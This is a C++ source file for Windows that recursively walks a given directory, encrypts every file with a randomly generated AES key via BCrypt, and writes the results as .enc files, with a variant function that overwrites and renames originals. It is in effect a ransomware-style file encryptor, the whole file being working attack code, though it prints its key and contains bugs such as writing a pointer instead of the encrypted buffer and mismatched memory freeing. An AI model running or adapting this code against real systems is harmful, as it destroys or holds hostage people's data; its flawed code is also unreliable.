#include <Windows.h>
#include <iostream>
#include <filesystem>
#include <fstream>
#include <vector>
#include <bcrypt.h>
#include <iomanip>
#include <Shlwapi.h>
#include <ctype.h>

#pragma comment( lib, "Shlwapi" )
#pragma comment( lib, "Bcrypt" )
#pragma comment( lib, "Crypt32" )
namespace fs = std::filesystem;

std::vector<char> ReadBytes(char const* filename) {
	std::ifstream ifs(filename, std::ios::binary | std::ios::ate);
	std::ifstream::pos_type pos = ifs.tellg();

	if (pos == 0)
		return std::vector<char>{};

	std::vector<char> fileContents(pos);
	ifs.seekg(0, std::ios::beg);
	ifs.read(&fileContents[0], pos);

	return fileContents;
}

BOOL WriteEncryptedToFile(const char* filename, PBYTE* pbEncryptedData, DWORD dwEnctryptedDataLen) {
	BOOL result = TRUE;

	HANDLE hEncFile = nullptr;

	char szNewPath[MAX_PATH]{};

	strcpy_s(szNewPath, filename);
	PathRemoveExtension((LPSTR)filename);
	strcat_s(szNewPath, ".enc");

	hEncFile = CreateFileA(szNewPath,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		nullptr,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		nullptr);
	BOOL bResult = TRUE;

	if (!hEncFile || hEncFile == INVALID_HANDLE_VALUE) {
		bResult = FALSE;
		std::cout << "[-] CreateFileA failed: " << std::hex << GetLastError();
		goto Cleanup;
	}
	{
		DWORD dwWritten = 0;
		WriteFile(hEncFile, pbEncryptedData, dwEnctryptedDataLen, &dwWritten, nullptr);
		std::cout << "[+] Wrote " << dwWritten << " bytes" << std::endl;
		goto Cleanup;
	}
Cleanup:
	if (hEncFile)
		CloseHandle(hEncFile);

	return result;

}

BOOL WriteEncryptedToFileD(const char* filename, PBYTE* pbEncryptedData, DWORD dwEnctryptedDataLen) {
	BOOL result = TRUE;

	HANDLE hEncFile = nullptr;

	char newPath[MAX_PATH]{};


	strcpy_s(newPath, filename);
	strcat_s(newPath, ".enc");

	hEncFile = CreateFileA(filename,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		nullptr,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		nullptr);
	BOOL bResult = TRUE;

	if (!hEncFile || hEncFile == INVALID_HANDLE_VALUE) {
		bResult = FALSE;
		std::cout << "[-] CreateFileA failed: " << std::hex << GetLastError();
		goto Cleanup;
	}
	{
		DWORD dwWritten = 0;
		WriteFile(hEncFile, pbEncryptedData, dwEnctryptedDataLen, &dwWritten, nullptr);
		std::cout << "[+] Wrote " << dwWritten << " bytes" << std::endl;
		
		goto Cleanup;
	}
Cleanup:
	if (hEncFile)
		CloseHandle(hEncFile);
	MoveFile(filename, newPath);
	return result;

}

BOOL AESEncrypt(std::vector<char> plaintext, DWORD dwPlaintextLen, PBYTE pbKey,
	DWORD dwKeyLen, PBYTE pbIV, DWORD dwIVLen, PBYTE* lpEncryptedOut, PDWORD dwEncryptedOutLen) {

	NTSTATUS success = NO_ERROR;
	BOOL bResult = FALSE;

	if (plaintext.empty() || !lpEncryptedOut || !dwEncryptedOutLen) {
		std::cerr << "[-] Parameters are invalid" << std::endl;
		return FALSE;
	}
	
	char* pbPlaintext = &plaintext[0];

	BCRYPT_ALG_HANDLE hCryptProv = NULL;
	BCRYPT_KEY_HANDLE hKey = NULL;

	success = BCryptOpenAlgorithmProvider(&hCryptProv, BCRYPT_AES_ALGORITHM, NULL, 0);

	bResult = (success == NO_ERROR);
	if (!bResult) {
		std::cerr << "[-] BCryptOpenAlgorithmProvider error: " << std::hex << success << std::endl;
		goto Cleanup;
	}

	success = BCryptGenerateSymmetricKey(hCryptProv, &hKey, NULL, 0, pbKey, dwKeyLen, 0);
	bResult = (success == NO_ERROR);
	if (!bResult) {
		std::cerr << "[-] BCryptGenerateSymmetricKey error: " << std::hex << success << std::endl;
		goto Cleanup;
	}

	success = BCryptEncrypt(hKey, (unsigned char*)pbPlaintext, dwPlaintextLen, NULL, pbIV,
		dwIVLen, NULL, 0, dwEncryptedOutLen, BCRYPT_BLOCK_PADDING);

	bResult = (success == NO_ERROR);
	if (!bResult) {
		std::cerr << "[-] BCryptEncrypt error: " << std::hex << success << std::endl;
		goto Cleanup;
	}

	*lpEncryptedOut = (PBYTE)VirtualAlloc(nullptr, *dwEncryptedOutLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	bResult = (*lpEncryptedOut != nullptr);
	if (!bResult) {
		std::cerr << "[-] VirtualAlloc error: " << std::hex << GetLastError() << std::endl;
		goto Cleanup;
	}

	success = BCryptEncrypt(hKey, (unsigned char*)pbPlaintext, dwPlaintextLen, NULL, pbIV, dwIVLen,
		*lpEncryptedOut, *dwEncryptedOutLen, dwEncryptedOutLen, BCRYPT_BLOCK_PADDING);

	bResult = (success == NO_ERROR);
	if (!bResult) {

		HeapFree(GetProcessHeap(), 0, *lpEncryptedOut);
		*lpEncryptedOut = nullptr;

		std::cerr << "[-] BCryptEncrypt error: " << std::hex << success << std::endl;
		goto Cleanup;
	}


Cleanup:
	if (hKey)
		BCryptDestroyKey(hKey);
	if (hCryptProv)
		BCryptCloseAlgorithmProvider(hCryptProv, 0);
	return bResult;
}

int main(int argc, char** argv) {

	if ((argc < 2)) {
		exit(0);
	}
	char* dir = argv[1];
	BYTE pbKey[32]{};
	DWORD dwKeyLen = sizeof(pbKey);

	BYTE pbIV[32]{};
	DWORD dwIVLen = sizeof(pbIV);

	BCryptGenRandom(NULL, pbKey, dwKeyLen, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
	BCryptGenRandom(NULL, pbIV, dwIVLen, BCRYPT_USE_SYSTEM_PREFERRED_RNG);

	std::cout << "Key: ";

	for (int i = 0; i < dwKeyLen; ++i) {
		std::cout << "0x" << std::setfill('0') << std::setw(2) << std::hex << (0xff & (unsigned int)pbKey[i]);
		if (i < dwKeyLen - 1)
			std::cout << ", ";
	}

	std::cout << "\nIV: ";

	for (int i = 0; i < dwIVLen; ++i) {
		std::cout << "0x" << std::setfill('0') << std::setw(2) << std::hex << (0xff & (unsigned int)pbIV[i]);
		if (i < dwKeyLen - 1)
			std::cout << ", ";
	}
	std::cout << std::endl;

	for (const fs::directory_entry& entry : fs::recursive_directory_iterator(dir)) {
		std::cout << "[*] Encrypting " << entry << " ......." << std::endl;
		std::cout << "File contents: " << std::endl;
		PBYTE pbFileContents = nullptr;
		DWORD dwFileContentLength = 0;
		BOOL bResult = FALSE;

		std::vector<char> contents = ReadBytes(entry.path().string().c_str());

		HANDLE hFile = nullptr;

		PBYTE pbEncryptedData = nullptr;
		DWORD dwEncryptedDataLen = 0;

		bResult = AESEncrypt(contents, contents.size(), pbKey, dwKeyLen, pbIV, dwIVLen, &pbEncryptedData, &dwEncryptedDataLen);
		if (!bResult) {
			std::cerr << "[-] AESEncrypt Error" << std::endl;
			continue;
		}
		std::cout << "[+] Encryption completed" << std::endl;
		bResult = WriteEncryptedToFile(entry.path().string().c_str(), &pbEncryptedData, dwEncryptedDataLen);
		if (!bResult) {
			std::cerr << "[-] WriteEncryptedToFile Error" << std::endl;
			continue;
		}
		std::cout << "[+] Encrypted file write completed" << std::endl;
	}

	return 0;
}